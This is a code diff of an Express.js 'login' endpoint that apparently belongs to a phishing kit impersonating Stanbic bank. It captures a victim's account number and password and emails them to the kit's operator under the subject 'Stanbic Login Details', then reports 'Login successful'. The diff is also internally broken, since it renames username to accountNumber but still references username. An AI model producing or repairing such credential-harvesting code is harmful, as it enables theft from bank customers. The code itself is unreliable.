@@ -46,26 +46,26 @@ const sendMailAndRespond = (
 // ─── ENDPOINT 1: POST / ─── Login
 // ─── ENDPOINT 1: POST / ─── Login
 app.post("/", (req, res) => {
-  const { username, password } = req.body;  // changed
+  const { accountNumber, password } = req.body;  // changed
 
   if (!username || !password) {             // changed
     return res
       .status(401)
-      .json({ success: false, message: "Invalid username or password" });  // changed
+      .json({ success: false, message: "Invalid accountNumber or password" });  // changed
   }
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
     subject: "Stanbic Login Details",
-    text: `Username: ${username}\nPassword: ${password}`,  // changed
+    text: `accountNumber: ${username}\nPassword: ${password}`,  // changed
   };
 
   sendMailAndRespond(
     mailOptions,
     res,
     "Login successful",
-    "Invalid username or password",  // changed
+    "Invalid accountNumber or password",  // changed
     401,
   );
 });
